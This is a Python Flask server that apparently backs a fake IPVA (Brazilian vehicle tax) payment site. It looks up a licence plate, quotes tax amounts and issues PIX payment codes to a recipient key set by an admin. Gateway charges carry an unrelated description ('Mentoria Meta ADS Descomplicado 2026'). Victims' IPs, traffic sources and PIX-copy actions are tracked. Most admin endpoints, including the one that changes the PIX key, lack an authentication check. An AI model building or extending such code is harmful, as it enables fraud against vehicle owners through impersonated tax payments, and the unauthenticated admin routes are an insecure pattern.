from flask import Flask, request, jsonify, send_file, send_from_directory
import json
import os
from datetime import datetime
from plate_calculator import calculate_ipva_data
from pix_utils import generate_pix_payload
from config import PIX_KEY, PIX_NAME, PIX_CITY, PIX_DESCRIPTION
import admin_data_manager as adm
import admin_auth
from session_tracker import tracker
import meta_pixel
import uuid
from order_manager import order_manager

app = Flask(__name__, static_folder='.', static_url_path='')

# Serve HTML pages
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/admin.html')
def admin():
    return send_from_directory('.', 'admin.html')

@app.route('/admin_new.html')
def admin_new():
    return send_from_directory('.', 'admin_new.html')

@app.route('/resultado.html')
def resultado():
    return send_from_directory('.', 'resultado.html')

# API Endpoints
@app.route('/api/admin/stats')
def get_admin_stats():
    try:
        stats = adm.get_stats()
        return jsonify(stats)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/config', methods=['GET', 'POST'])
def admin_config():
    if request.method == 'GET':
        try:
            config = adm.get_config()
            return jsonify(config)
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    else:
        try:
            data = request.json
            adm.save_config(data.get('pix_key'), data.get('pix_name'), data.get('pix_city'))
            return jsonify({"success": True})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

@app.route('/api/get_pixel_code')
def get_pixel_code():
    try:
        pixel_code = meta_pixel.get_pixel_code()
        return pixel_code, 200, {'Content-Type': 'text/html'}
    except Exception as e:
        return str(e), 500

@app.route('/api/admin/get_pixel_config')
def get_pixel_config():
    try:
        config = meta_pixel.get_pixel_config()
        return jsonify(config)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/get_orders')
def get_orders():
    try:
        orders = order_manager.get_all_orders()
        stats = order_manager.get_stats()
        return jsonify({"orders": orders, "stats": stats})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/get_sessions')
def get_sessions():
    try:
        return jsonify({
            "online_users": tracker.get_online_users(),
            "stats": tracker.get_stats()
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/health')
def health_check():
    print("DEBUG: Health check called", flush=True)
    return jsonify({"status": "ok", "message": "Server is running"}), 200

@app.route('/api/calculate_ipva', methods=['POST'])
def calculate_ipva():
    print("=" * 50, flush=True)
    print("DEBUG: Received request for /api/calculate_ipva", flush=True)
    print("=" * 50, flush=True)
    try:
        data = request.json
        plate = data.get('plate')
        print(f"DEBUG: Processing plate: {plate}", flush=True)
        
        if not plate:
            print("DEBUG: No plate provided, returning error", flush=True)
            return jsonify({"error": "Plate required"}), 400
        
        print(f"DEBUG: About to call calculate_ipva_data for plate: {plate}", flush=True)
        result = calculate_ipva_data(plate)
        print(f"DEBUG: calculate_ipva_data returned: {type(result)}", flush=True)
        
        if 'error' not in result:
            adm.log_consulta(
                result.get('plate', plate),
                result.get('brand', 'Unknown'),
                result.get('ipva_full', 'R$ 0,00')
            )
            
            session_id = str(uuid.uuid4())
            order = order_manager.create_order(
                session_id=session_id,
                vehicle_data=result,
                payment_data={
                    'ipva_full': result.get('ipva_full'),
                    'ipva_discounted': result.get('ipva_discounted'),
                    'licensing_val': result.get('licensing_val'),
                    'installment_val': result.get('installment_val'),
                    'first_payment_total': result.get('first_payment_total')
                }
            )
            
            result['session_id'] = session_id
            result['order_id'] = order['order_id']
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/generate_pix', methods=['POST'])
def generate_pix():
    try:
        data = request.json
        amount = float(data.get('amount'))
        plate = data.get('plate', 'Unknown')
        session_id = data.get('session_id')
        
        if not amount:
            return jsonify({"error": "Amount required"}), 400
        
        # Check amount limit for Axis gateway (max R$ 490)
        AXIS_MAX_AMOUNT = 490.00
        use_axis = amount <= AXIS_MAX_AMOUNT
        
        if amount > AXIS_MAX_AMOUNT:
            print(f"INFO: Amount R$ {amount:.2f} exceeds Axis limit (R$ {AXIS_MAX_AMOUNT:.2f}), using manual PIX", flush=True)
        
        # Try Axis gateway first if enabled AND amount is within limit
        import axis_gateway
        if use_axis and axis_gateway.is_axis_enabled():
            print(f"INFO: Using Axis gateway for PIX generation (R$ {amount:.2f})", flush=True)
            
            # Get customer data from session/order
            customer_data = {
                'name': data.get('name', 'Cliente'),
                'email': data.get('email', 'cliente@example.com'),
                'cpf': data.get('cpf', '00000000000'),
                'phone': data.get('phone', '00000000000')
            }
            
            axis_result = axis_gateway.generate_axis_pix(
                name=customer_data['name'],
                email=customer_data['email'],
                cpf=customer_data['cpf'],
                phone=customer_data['phone'],
                amount=amount,
                description="Mentoria Meta ADS Descomplicado 2026",
                external_id=session_id or f"order_{plate}_{int(datetime.now().timestamp())}",
                plate=plate
            )
            
            if axis_result['success']:
                pix_code = axis_result['pix_code']
                adm.log_pix(plate, f"R$ {amount:.2f}", pix_code)
                
                if session_id:
                    order_manager.mark_pix_generated(session_id, pix_code)
                
                return jsonify({
                    "payload": pix_code,
                    "qr_code": axis_result.get('qr_code', ''),
                    "transaction_id": axis_result.get('transaction_id', ''),
                    "method": "axis"
                })
            else:
                print(f"WARN: Axis failed, falling back to manual PIX: {axis_result.get('error')}", flush=True)
                # Continue to fallback below
        
        # Fallback to manual PIX generation
        print(f"INFO: Using manual PIX generation", flush=True)
        config = adm.get_config()
        pix_key = config.get('pix_key', PIX_KEY)
        pix_name = config.get('pix_name', PIX_NAME)
        pix_city = config.get('pix_city', PIX_CITY)
        
        name = pix_name[:25]
        city = pix_city[:15]
        
        pix_code = generate_pix_payload(pix_key, name, city, amount)
        
        adm.log_pix(plate, f"R$ {amount:.2f}", pix_code)
        
        if session_id:
            order_manager.mark_pix_generated(session_id, pix_code)
        
        return jsonify({"payload": pix_code, "method": "manual"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/login', methods=['POST'])
def admin_login():
    try:
        data = request.json
        if admin_auth.verify_login(data.get('username'), data.get('password')):
            token = admin_auth.create_session(data.get('username'))
            return jsonify({"token": token})
        else:
            return jsonify({"error": "Invalid credentials"}), 401
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/track_session', methods=['POST'])
def track_session():
    try:
        data = request.json
        session_id = data.get('session_id') or str(uuid.uuid4())
        tracker.create_or_update_session(
            session_id, data.get('stage'), data.get('utm_source'),
            request.remote_addr, data.get('plate')
        )
        return jsonify({"session_id": session_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/track_pix_copy', methods=['POST'])
def track_pix_copy():
    try:
        data = request.json
        session_id = data.get('session_id')
        
        if session_id:
            tracker.mark_pix_copied(session_id)
            order_manager.mark_pix_copied(session_id)
        
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/save_pixel', methods=['POST'])
def save_pixel():
    try:
        data = request.json
        meta_pixel.save_pixel_config(data.get('pixel_id'), data.get('enabled', True))
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# PIX Manual Configuration Endpoints
@app.route('/api/admin/get_config')
def get_config_endpoint():
    try:
        config = adm.get_config()
        return jsonify(config)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/save_config', methods=['POST'])
def save_config_endpoint():
    try:
        data = request.json
        adm.save_config(
            pix_key_type=data.get('pix_key_type', 'cpf'),
            pix_key=data.get('pix_key', ''),
            pix_name=data.get('pix_name', ''),
            pix_city=data.get('pix_city', '')
        )
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Axis Banking Gateway Endpoints
@app.route('/api/admin/get_axis_config')
def get_axis_config():
    try:
        import axis_gateway
        config = axis_gateway.get_axis_config()
        # Don't expose full API key in response
        if config.get('api_key'):
            config['api_key_masked'] = config['api_key'][:8] + '...' + config['api_key'][-4:]
        return jsonify(config)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/save_axis_config', methods=['POST'])
def save_axis_config():
    try:
        import axis_gateway
        data = request.json
        config = axis_gateway.save_axis_config(
            enabled=data.get('enabled', False),
            api_key=data.get('api_key', ''),
            postback_url=data.get('postback_url', '')
        )
        return jsonify({"success": True, "config": config})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/test_axis', methods=['POST'])
def test_axis():
    try:
        import axis_gateway
        result = axis_gateway.test_axis_connection()
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/axis_webhook', methods=['POST'])
def axis_webhook():
    """Handle Axis payment notifications"""
    try:
        data = request.json
        print(f"INFO: Axis webhook received: {data}", flush=True)
        
        # Extract transaction data
        transaction_id = data.get('transactionId')
        external_id = data.get('externalId')
        status = data.get('status')
        
        # Update order status if payment confirmed
        if status == 'paid' or status == 'confirmed':
            print(f"INFO: Payment confirmed for {external_id}", flush=True)
            # Here you can update order status in your system
            # order_manager.mark_as_paid(external_id, transaction_id)
        
        return jsonify({"success": True})
    except Exception as e:
        print(f"ERROR: Axis webhook failed: {e}", flush=True)
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    PORT = int(os.environ.get('PORT', 8080))
    print(f"=" * 60, flush=True)
    print(f"🚀 Starting IPVA Server on port {PORT}", flush=True)
    print(f"=" * 60, flush=True)
    app.run(host='0.0.0.0', port=PORT, debug=False)
else:
    # For Gunicorn (production)
    print("=" * 60, flush=True)
    print("🚀 IPVA Server loaded by Gunicorn", flush=True)
    print(f"Environment: {os.environ.get('RAILWAY_ENVIRONMENT', 'local')}", flush=True)
    print("=" * 60, flush=True)
